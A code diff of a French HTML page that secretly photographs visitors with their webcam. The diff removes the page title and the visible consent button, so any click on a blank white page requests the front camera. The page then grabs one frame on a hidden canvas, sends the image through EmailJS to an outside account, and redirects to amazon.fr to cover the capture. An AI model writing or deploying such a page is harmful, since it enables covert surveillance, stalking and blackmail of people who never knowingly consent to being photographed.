@@ -2,34 +2,23 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Photo invisible</title>
+  <title></title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #fafafa;
+    body, html {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
     }
-    button {
-      padding: 12px 18px;
-      font-size: 14px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      background: #007bff;
-      color: white;
-    }
-    /* Cache totalement les éléments techniques */
     video, canvas {
       display: none !important;
     }
   </style>
 </head>
 <body>
-  <button id="capture">📸 Autoriser et continuer</button>
-
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="200" height="150"></canvas>
 
@@ -39,35 +28,32 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const button = document.getElementById('capture');
 
-    button.addEventListener('click', async () => {
+    // Déclenche au premier clic n’importe où
+    document.body.addEventListener('click', async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // Quand la vidéo est prête → capture immédiate
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/jpeg", 0.2);
 
-          // Stop caméra
+          // Stop caméra après capture
           stream.getTracks().forEach(track => track.stop());
 
           // Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo capturée et envoyée 📸",
+            message: "Photo automatique 📸",
             image: imageData
           }).finally(() => {
-            // Redirection automatique après envoi ou erreur
             window.location.href = "https://www.amazon.fr";
           });
         };
       } catch (err) {
-        // Si refus ou erreur → quand même rediriger
         window.location.href = "https://www.amazon.fr";
       }
-    });
+    }, { once: true });
   </script>
 </body>
 </html>
